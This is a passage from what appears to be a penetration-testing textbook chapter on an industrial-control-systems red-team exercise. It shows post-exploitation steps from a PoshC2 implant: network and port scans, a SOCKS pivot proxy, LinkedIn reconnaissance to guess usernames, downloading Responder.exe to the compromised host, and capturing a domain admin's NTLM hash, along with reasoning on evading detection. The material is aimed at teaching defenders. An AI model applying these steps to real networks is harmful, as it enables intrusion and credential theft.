
Adding to the list of Blue Team observations, we have the following:

- Ingress connections from the internet should be closely monitored.
- Downloads of executable file formats should be monitored.

## Enterprise reconnaissance

At this point, we have a persistent connection into *Company Z*'s enterprise network. The next activities we will be performing will be around exploration of the environment to see if we can find other (interesting) systems to exploit. With the objective being to perform a firmware upgrade on an automation device, we should start by figuring out where the PLC resides on the network. To test our luck and see if we are on a flat network with business equipment and automation devices on the same network/subnet, we can scan the local network and see if we can find any ICS devices. There are several scanning functions built into the PoshC2 implant that can do this for us. One of the functions is `arpscan`. We run the following command:

```
TEST_REPORTSSER\reports_user @ TEST_REPORTSSER (PID:5976)
PS 12> arpscan
```

The preceding command gives us a listing of all the systems that are on *Company Z*'s enterprise network segment we are on, as follows:

![](img/c8ffa9959721097701584fcc95101362_629_0.png)

Figure 16.12 – Running arpscan implant function

We can now take the media access control (MAC) address and look up the vendor via an online tool such as https://macvendors.com/, as illustrated in the following screenshot:

![](img/c8ffa9959721097701584fcc95101362_630_0.png)

Figure 16.13 – MAC address lookup

If we find any automation vendors, we know where to put our attention next. Additionally, we can perform port scanning on the found systems and see if there are any open ports that are typically found on automation devices, such as 2222, 44818, 502, and so on. The function to use within the implant is portscan, as illustrated here:

```
TEST_REPORTSSER\reports_user @ TEST_REPORTSSER (PID:5976)
PS 12> portscan 10.0.0.100
```

This shows us the open ports for 10.0.0.100 in the posh-server screen, as follows:

![](img/c8ffa9959721097701584fcc95101362_630_1.png)

Figure 16.14 – Running portscan implant function

> **Note**
>
> We could set up a **Socket Secure (SOCKS)** proxy server and have our implant tunnel traffic from the attacker machine. That way, we can use familiar tools such as Nmap to scan the network.

To set up a SOCKS5 proxy into Company Z's network, follow these instructions:

1. From the implant handler screen, type `sharpsocks`. Immediately after, a line will be printed out in the implant-handler screen, with arguments to start the SOCKS server on the attacker side. Copy this command line and paste it into a new Terminal (NOT the implant-handler terminal).
2. Once the server has started in the new Terminal, switch back to the implant-handler screen and type `Y` to send the `sharpsocks` command to the implant. The output should now state that the implant has started. If it has started, you should see the port that the SOCKS proxy is listening on (by default, this is on port 43334).
3. Configure `proxychains` or any other SOCKS proxy-capable tool with `localhost:43334`.
4. We are now set up to start using the proxy server.

The following screenshot shows an overview of these activities:

![](img/c8ffa9959721097701584fcc95101362_631_0.png)

The SOCKS proxy connection will be used later, when we start pivoting deeper into Company Z's network.

After extensive reconnaissance, we realize the path to victory isn't as easy as we hoped. Company Z seem to have segmented their network to better protect their industrial systems. We need to figure out if there are any enterprise systems that have access into that segmented network. We could see if we can find some domain credentials and try to connect to every machine on the network, searching for evidence that the system is used for accessing industrial equipment. Don't forget, we have all the time in the world to accomplish our objective. However, if we step back and think about things for a second, why not find out if there are any known controls engineers for Company Z and find out which permissions that person has? Social media has made this type of research extremely easy. A simple query for Company Z engineers on LinkedIn gets us several names to try, as follows:

![](img/c8ffa9959721097701584fcc95101362_632_0.png)

Figure 16.16 – LinkedIn search for Company Z engineers

We can see the following individuals working in engineering positions for *Company Z*:

- **Ann Harbor**
- **Joe Smith**
- **Mark Gibson**
- **Marina Soeters**

During reconnaissance, we discovered that *Company Z*'s usernames consist of concatenating the first letter of a user's first name with their last name, as in Jane Doe - jdoe, which gives us the following usernames to hunt for:

- `Aharbor`
- `Jsmith`
- `Mgibson`
- `Msoeters`

Armed with that list, we can sniff, probe, and search around the enterprise network until we find a system that is accessible or accessed by one of those users. If we were on a domain-joined computer, this would be a PowerShell exercise, maybe even using **BloodHound** (https://github.com/BloodHoundAD/BloodHound). However, the test server we are on is not connected to the lab-domain.local Windows domain (as found with the get-computerinfo implant command).

To figure out where any of these users are logged in, we need to maneuver ourselves onto a domain-joined computer so that we can start probing around using PowerShell commands. The reason I like to use PowerShell during activities on a Windows domain environment is because these kinds of commands blend in well with normal activity on Windows machines. The more exotic the tools we use, the more likely they set off alarm bells or get detected by antivirus software. This is commonly referred to as **Living off the Land (LotL)**, using tools that are commonly available in the environment you are in. The reason we need to get a foothold to a domain-joined computer is that the functionality we are after is more easily available from a domain-joined computer. Also, the commands we will be running are less likely to be detected because they are commonly used by domain members. To get onto a domain member machine, we either need to find a domain-joined computer that has a vulnerability or somehow grab credentials. Before I start scanning the network with noisy tools, I like to see if I can grab some hashed credentials off the network. A tool that remains one of the best options to help find those credentials is Responder by **Spiderlabs** (https://github.com/SpiderLabs/Responder), described here:

> Responder is an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answer to File Server Service requests, which is for SMB.
>
> The concept behind this is to target our answers and be stealthier on the network. This also helps to ensure that we don't break legitimate NBT-NS behavior. You can set the -r option via the command line if you want to answer to the Workstation Service request name suffix.

The Responder tool was originally developed for Python, and was later forked into a Windows executable by **Lgandx** (https://github.com/lgandx). The download link for the Windows version is `https://github.com/lgandx/Responder-Windows/raw/master/binaries/Responder/Responder.exe`.

We can download the executable to the RDP server with Invoke-WebRequest, as follows:

```
TEST_REPORTSSER\reports_user @ TEST_REPORTSSER (PID:5976)
PS 12> invoke-webrequest -Uri "https://github.com/lgandx/Responder-Windows/raw/master/binaries/Responder/Responder.exe" -outfile responder.exe
```

![](img/c8ffa9959721097701584fcc95101362_634_0.png)

We now run the `responder.exe` tool and sit back and wait, as follows:

![](img/c8ffa9959721097701584fcc95101362_635_0.png)

Figure 16.18 – Running responder.exe

After some time, we see responder sniff credentials from the network for `admin1`. They are **New Technology LAN Manager (NTLM)** hashes for an `admin1` user, which we know from our reconnaissance is a domain admin account. These can be seen in the following screenshot:

![](img/c8ffa9959721097701584fcc95101362_635_1.png)

Figure 16.19 – Responder discovered NTLMv2 hash for admin1
